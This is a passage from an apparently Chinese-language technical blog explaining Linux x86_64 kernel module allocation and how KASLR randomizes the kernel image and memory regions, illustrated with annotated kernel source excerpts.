<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 定义模块相关的虚拟地址区域</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MODULE_ALIGN PAGE_SIZE <span class="comment">// 模块加载基址的对齐值</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MODULES_VADDR        (__START_KERNEL_map + KERNEL_IMAGE_SIZE)  <span class="comment">// 模块加载的起始虚拟地址，位于内核映像之后</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MODULES_END          _AC(0xffffffffff000000, UL)  <span class="comment">// 模块加载的结束虚拟地址，通常设置为64位地址空间的上限</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MODULES_LEN          (MODULES_END - MODULES_VADDR)  <span class="comment">// 模块加载区域的长度，等于结束地址减去起始地址</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 分配指定大小的内存用于加载模块。</span></span><br><span class="line"><span class="comment"> * 如果 KASLR（内核地址空间布局随机化）启用，模块的加载地址会有所不同。</span></span><br><span class="line"><span class="comment"> * 这个函数使用了 __vmalloc_node_range() 来从指定的内存区域分配内存。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> *<span class="title function_">module_alloc</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *p;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查请求的内存是否大于模块可用的内存区域，如果超出范围，则返回NULL</span></span><br><span class="line">    <span class="keyword">if</span> (PAGE_ALIGN(size) &gt; MODULES_LEN)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 使用 __vmalloc_node_range() 分配内存：</span></span><br><span class="line"><span class="comment">     * size      : 分配的内存大小</span></span><br><span class="line"><span class="comment">     * MODULE_ALIGN : 对齐要求</span></span><br><span class="line"><span class="comment">     * MODULES_VADDR + get_module_load_offset() : 分配地址起始位置（基于KASLR和偏移量）</span></span><br><span class="line"><span class="comment">     * MODULES_END : 分配地址的结束位置</span></span><br><span class="line"><span class="comment">     * GFP_KERNEL : 分配标志</span></span><br><span class="line"><span class="comment">     * PAGE_KERNEL_EXEC : 页面类型，表示内存可执行</span></span><br><span class="line"><span class="comment">     * 0 : 没有NUMA节点</span></span><br><span class="line"><span class="comment">     * __builtin_return_address(0) : 当前函数调用的返回地址，用于调试</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    p = __vmalloc_node_range(size, MODULE_ALIGN,</span><br><span class="line">                              MODULES_VADDR + get_module_load_offset(),</span><br><span class="line">                              MODULES_END, GFP_KERNEL,</span><br><span class="line">                              PAGE_KERNEL_EXEC, <span class="number">0</span>, NUMA_NO_NODE,</span><br><span class="line">                              __builtin_return_address(<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果内存分配成功且 KASAN（内核地址空间保护）检测失败</span></span><br><span class="line">    <span class="keyword">if</span> (p &amp;&amp; (kasan_module_alloc(p, size) &lt; <span class="number">0</span>)) &#123;</span><br><span class="line">        vfree(p);  <span class="comment">// 释放已分配的内存</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;  <span class="comment">// 返回NULL，表示内存分配失败</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回分配的内存指针</span></span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="KASLR"><a href="#KASLR" class="headerlink" title="KASLR"></a>KASLR</h3><h4 id="内核镜像地址随机化"><a href="#内核镜像地址随机化" class="headerlink" title="内核镜像地址随机化"></a>内核镜像地址随机化</h4><p>对于 <code>bzImage</code> 这种压缩过的内核镜像，在启动内核前需要执行 <code>extract_kernel</code> 函数进行解压。其中调用的 <code>choose_random_location</code> 函数会选择一个随机的物理地址 <code>output</code> 和虚拟地址 <code>virt_addr</code> 作为内核镜像的存放地址。</p>

  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content">
      <p>从 <code>extract_kernel</code> 函数中我们得出以下结论：</p>
<ul>
<li><p>只有压缩的内核镜像才会在随机地址加载，<code>vmlinux</code> 镜像加载地址不随机。</p>
</li>
<li><p>内核镜像加载的物理地址和虚拟地址都要关于 <code>MIN_KERNEL_ALIGN (0x200000)</code> 对齐。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PMD_SHIFT	21</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> MIN_KERNEL_ALIGN_LG2	PMD_SHIFT</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MIN_KERNEL_ALIGN	(_AC(1, UL) &lt;&lt; MIN_KERNEL_ALIGN_LG2)</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p>如果没有地址随机化，则内核加载的物理地址为 <code>LOAD_PHYSICAL_ADDR(0x1000000)</code>。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> CONFIG_PHYSICAL_START 0x1000000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CONFIG_PHYSICAL_ALIGN 0x200000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LOAD_PHYSICAL_ADDR ((CONFIG_PHYSICAL_START \</span></span><br><span class="line"><span class="meta">				+ (CONFIG_PHYSICAL_ALIGN - 1)) \</span></span><br><span class="line"><span class="meta">				&amp; ~(CONFIG_PHYSICAL_ALIGN - 1))</span></span><br></pre></td></tr></table></figure></div></li>
</ul>

    </div>
  </div>

<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 压缩后的内核镜像 (ZO) 已被移动到用于存放未压缩内核镜像 (VO) 和执行环境 (.bss, .brk) 的缓冲区末端，</span></span><br><span class="line"><span class="comment"> * 这样可以确保有足够的空间进行原地解压缩。(有关计算，请参见 header.S。)</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *                             |-----------压缩后的内核镜像----------|</span></span><br><span class="line"><span class="comment"> *                             V                                  V</span></span><br><span class="line"><span class="comment"> * 0                       extract_offset                    +INIT_SIZE</span></span><br><span class="line"><span class="comment"> * |-----------|---------------|-------------------------|--------|</span></span><br><span class="line"><span class="comment"> *             |               |                         |        |</span></span><br><span class="line"><span class="comment"> *           VO__text      startup_32 of ZO          VO__end    ZO__end</span></span><br><span class="line"><span class="comment"> *             ^                                         ^</span></span><br><span class="line"><span class="comment"> *             |--------------未压缩的内核镜像--------------|</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">asmlinkage __visible <span class="type">void</span> *<span class="title function_">extract_kernel</span><span class="params">(<span class="type">void</span> *rmode, memptr heap,</span></span><br><span class="line"><span class="params">                  <span class="type">unsigned</span> <span class="type">char</span> *input_data,</span></span><br><span class="line"><span class="params">                  <span class="type">unsigned</span> <span class="type">long</span> input_len,</span></span><br><span class="line"><span class="params">                  <span class="type">unsigned</span> <span class="type">char</span> *output,</span></span><br><span class="line"><span class="params">                  <span class="type">unsigned</span> <span class="type">long</span> output_len)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 计算未压缩内核镜像的总大小</span></span><br><span class="line">    <span class="type">const</span> <span class="type">unsigned</span> <span class="type">long</span> kernel_total_size = VO__end - VO__text;</span><br><span class="line">    <span class="comment">// 初始化虚拟地址为加载物理地址</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> virt_addr = LOAD_PHYSICAL_ADDR;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 保留从 startup_32/64 传递过来的 x86 启动参数指针 */</span></span><br><span class="line">    boot_params = rmode;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 清除标志位 KASLR_FLAG */</span></span><br><span class="line">    boot_params-&gt;hdr.loadflags &amp;= ~KASLR_FLAG;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 内核所需的内存空洞是以下两者中的较大值：</span></span><br><span class="line"><span class="comment">     * 1. 完整的解压内核加上重定位表</span></span><br><span class="line"><span class="comment">     * 2. 完整的解压内核加上 .bss 和 .brk 段</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    choose_random_location((<span class="type">unsigned</span> <span class="type">long</span>)input_data, input_len,</span><br><span class="line">                (<span class="type">unsigned</span> <span class="type">long</span> *)&amp;output,</span><br><span class="line">                max(output_len, kernel_total_size),</span><br><span class="line">                &amp;virt_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 验证内存位置的选择是否正确 */</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)output &amp; (MIN_KERNEL_ALIGN - <span class="number">1</span>))</span><br><span class="line">        error(<span class="string">&quot;Destination physical address inappropriately aligned&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (virt_addr &amp; (MIN_KERNEL_ALIGN - <span class="number">1</span>))</span><br><span class="line">        error(<span class="string">&quot;Destination virtual address inappropriately aligned&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 输出解压内核的调试信息</span></span><br><span class="line">    debug_putstr(<span class="string">&quot;\nDecompressing Linux... &quot;</span>);</span><br><span class="line">    <span class="comment">// 执行内核解压缩</span></span><br><span class="line">    __decompress(input_data, input_len, <span class="literal">NULL</span>, <span class="literal">NULL</span>, output, output_len,</span><br><span class="line">            <span class="literal">NULL</span>, error);</span><br><span class="line">    <span class="comment">// 解析 ELF 格式的内核镜像</span></span><br><span class="line">    parse_elf(output);</span><br><span class="line">    <span class="comment">// 处理重定位</span></span><br><span class="line">    handle_relocations(output, output_len, virt_addr);</span><br><span class="line">    <span class="comment">// 输出完成信息并启动内核</span></span><br><span class="line">    debug_putstr(<span class="string">&quot;done.\nBooting the kernel.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> output;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在 <code>choose_random_location</code> 函数中会调用 <code>find_random_phys_addr</code> 和 <code>find_random_virt_addr</code> 函数分别选择一个随机的物理地址和虚拟地址。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * choose_random_location - 选择随机的物理和虚拟地址位置</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @input: 解压前内核镜像的起始物理地址</span></span><br><span class="line"><span class="comment"> * @input_size: 解压前内核镜像的大小</span></span><br><span class="line"><span class="comment"> * @output: 为解压后内核镜像随机选择的物理地址</span></span><br><span class="line"><span class="comment"> * @output_size: 解压后内核镜像的大小</span></span><br><span class="line"><span class="comment"> * @virt_addr: 为解压后内核镜像随机选择的虚拟地址</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 该函数负责选择一个随机的物理地址和虚拟地址，用于内核加载，</span></span><br><span class="line"><span class="comment"> * 以实现KASLR的随机化效果。它首先检查命令行是否禁用了KASLR，</span></span><br><span class="line"><span class="comment"> * 然后初始化身份映射页表，记录需要避开的内存区域，</span></span><br><span class="line"><span class="comment"> * 并通过find_random_phys_addr和find_random_virt_addr函数选择随机地址。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">choose_random_location</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> input,</span></span><br><span class="line"><span class="params">                <span class="type">unsigned</span> <span class="type">long</span> input_size,</span></span><br><span class="line"><span class="params">                <span class="type">unsigned</span> <span class="type">long</span> *output,</span></span><br><span class="line"><span class="params">                <span class="type">unsigned</span> <span class="type">long</span> output_size,</span></span><br><span class="line"><span class="params">                <span class="type">unsigned</span> <span class="type">long</span> *virt_addr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> random_addr, min_addr;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 检查命令行参数是否禁用了KASLR */</span></span><br><span class="line">    <span class="keyword">if</span> (cmdline_find_option_bool(<span class="string">&quot;nokaslr&quot;</span>)) &#123;</span><br><span class="line">        warn(<span class="string">&quot;KASLR disabled: &#x27;nokaslr&#x27; on cmdline.&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">     * 设置KASLR标志，表示内核将被随机化加载。</span></span><br><span class="line"><span class="comment">     * 在后续流程中因为这个标志位，线性映射区、虚拟内存映射区域和 vmalloc/ioremap space 都会被随机化。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    boot_params-&gt;hdr.loadflags |= KASLR_FLAG;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 初始化身份映射页表，为随机化过程做好准备 */</span></span><br><span class="line">    initialize_identity_maps();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 记录各种已知的不安全内存范围的 mem_avoid 数组，避免内存重叠 </span></span><br><span class="line"><span class="comment">     * 其中参数用来计算解压内核所用到的内存区域的范围。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    mem_avoid_init(input, input_size, *output);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 随机化范围的低端应为 512M 或初始内核镜像默认加载位置中的较小者，</span></span><br><span class="line"><span class="comment">     * 以确保内核不会加载到过低的内存地址，防止与系统保留内存冲突。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    min_addr = min(*output, <span class="number">512UL</span> &lt;&lt; <span class="number">20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 遍历可用的内存条目以找到随机地址 */</span></span><br><span class="line">    random_addr = find_random_phys_addr(min_addr, output_size);</span><br><span class="line">    <span class="keyword">if</span> (!random_addr) &#123;</span><br><span class="line">        warn(<span class="string">&quot;Physical KASLR disabled: no suitable memory region!&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">/* 如果找到新的物理地址，则更新输出地址 */</span></span><br><span class="line">        <span class="keyword">if</span> (*output != random_addr) &#123;</span><br><span class="line">            add_identity_map(random_addr, output_size);</span><br><span class="line">            *output = random_addr;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 加载身份映射页表。</span></span><br><span class="line"><span class="comment">         * 只有在为内核找到新的物理地址时才应执行此操作，</span></span><br><span class="line"><span class="comment">         * 否则应保留旧的页表，使其类似于 &quot;nokaslr&quot; 情况。</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        finalize_identity_maps();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 如果是64位系统，则选择一个随机的虚拟地址 */</span></span><br><span class="line">    <span class="keyword">if</span> (IS_ENABLED(CONFIG_X86_64))</span><br><span class="line">        random_addr = find_random_virt_addr(LOAD_PHYSICAL_ADDR, output_size);</span><br><span class="line">    *virt_addr = random_addr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="内存映射区随机化"><a href="#内存映射区随机化" class="headerlink" title="内存映射区随机化"></a>内存映射区随机化</h4><p>由于在 <code>choose_random_location</code> 函数中中设置了 <code>boot_params.hdr.loadflags</code> 的 <code>KASLR_FLAG</code> 标志位，因此 <code>kernel_randomize_memory</code> 函数会对<strong>线性映射区</strong>、<strong>虚拟内存映射区域</strong>、**<code>vmalloc/iomemmap space</code>** 的进行随机化。</p>

  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content">
      <p>通过分析代码可知，对于四级页表，随机化的偏移关于 <code>PUD_MASK(0x40000000)</code> 对齐。</p>

    </div>
  </div>

<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 结束地址（vaddr_end）本可以依赖于更多的配置选项，以便为内存随机化提供更大的空间，</span></span><br><span class="line"><span class="comment"> * 但这样会使配置变得过于复杂，并且已经引发了一些问题。因此，为了简化内存随机化的实现，</span></span><br><span class="line"><span class="comment"> * 决定将结束地址固定为CPU入口区域的基地址。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">unsigned</span> <span class="type">long</span> vaddr_end = CPU_ENTRY_AREA_BASE; <span class="comment">// 虚拟地址空间的结束地址，设置为CPU入口区域的基地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 由KASLR（内核地址空间布局随机化）随机化的内存区域（不包括在引导过程中</span></span><br><span class="line"><span class="comment"> * 使用单独逻辑的模块）。此列表根据虚拟地址排序，随机化后保持该顺序。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> __initdata <span class="class"><span class="keyword">struct</span> <span class="title">kaslr_memory_region</span> &#123;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> *base;  <span class="comment">// 内存区域的基地址指针（虚拟地址）</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> size_tb; <span class="comment">// 内存区域的大小，以TB（泰比字节）为单位</span></span><br><span class="line">&#125; kaslr_regions[] = &#123;</span><br><span class="line">	&#123; &amp;page_offset_base, <span class="number">0</span> &#125;, <span class="comment">// 线性映射区基址，初始大小为0</span></span><br><span class="line">	&#123; &amp;vmalloc_base, <span class="number">0</span> &#125;,      <span class="comment">// vmalloc/ioremap 区域基址，初始大小为0</span></span><br><span class="line">	&#123; &amp;vmemmap_base, <span class="number">1</span> &#125;,      <span class="comment">// 虚拟内存映射区域基址，初始大小为1TB</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">bool</span> <span class="title function_">kaslr_enabled</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> !!(boot_params.hdr.loadflags &amp; KASLR_FLAG);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 如果在引导时禁用了KASLR，或者启用了KASAN（内核地址空间错误检测器），</span></span><br><span class="line"><span class="comment"> * 则不应用随机化。因为KASAN的影子映射依赖于内存区域与PGD（页全局目录）对齐。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">bool</span> <span class="title function_">kaslr_memory_enabled</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> kaslr_enabled() &amp;&amp; !IS_ENABLED(CONFIG_KASAN);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 初始化每个由KASLR随机化的内存区域的基地址和填充。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> __init <span class="title function_">kernel_randomize_memory</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">size_t</span> i;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> vaddr_start, vaddr;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> rand, memory_tb;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rnd_state</span> <span class="title">rand_state</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> remain_entropy;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 根据是否启用五级页表，设置虚拟地址的起始位置</span></span><br><span class="line">    <span class="comment">// #define __PAGE_OFFSET_BASE_L4	_AC(0xffff888000000000, UL)</span></span><br><span class="line">	vaddr_start = pgtable_l5_enabled() ? __PAGE_OFFSET_BASE_L5 : __PAGE_OFFSET_BASE_L4;</span><br><span class="line">	vaddr = vaddr_start;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// [...]</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 如果KASLR未启用，则无需进行随机化，直接返回</span></span><br><span class="line">	<span class="keyword">if</span> (!kaslr_memory_enabled())</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 设置各个内存区域的大小（以TB为单位）</span></span><br><span class="line">	kaslr_regions[<span class="number">0</span>].size_tb = <span class="number">1</span> &lt;&lt; (__PHYSICAL_MASK_SHIFT - TB_SHIFT); <span class="comment">// 线性映射区域大小</span></span><br><span class="line">	kaslr_regions[<span class="number">1</span>].size_tb = VMALLOC_SIZE_TB; <span class="comment">// vmalloc/ioremap 区域大小</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * 更新线性映射区域为可用内存，并在需要时添加填充（特别是为了支持内存热插拔）。</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	BUG_ON(kaslr_regions[<span class="number">0</span>].base != &amp;page_offset_base); <span class="comment">// 确保第一个区域基地址正确</span></span><br><span class="line">	memory_tb = DIV_ROUND_UP(max_pfn &lt;&lt; PAGE_SHIFT, <span class="number">1UL</span> &lt;&lt; TB_SHIFT) +</span><br><span class="line">		CONFIG_RANDOMIZE_MEMORY_PHYSICAL_PADDING; <span class="comment">// 计算物理内存的TB数量，并加上随机化填充（默认为0）</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* 根据可用线性映射区域的大小 */</span></span><br><span class="line">	<span class="keyword">if</span> (memory_tb &lt; kaslr_regions[<span class="number">0</span>].size_tb)</span><br><span class="line">		kaslr_regions[<span class="number">0</span>].size_tb = memory_tb;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* 可用的随机范围，即可用内存空间减去需要映射的区域的大小。 */</span></span><br><span class="line">	remain_entropy = vaddr_end - vaddr_start;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; 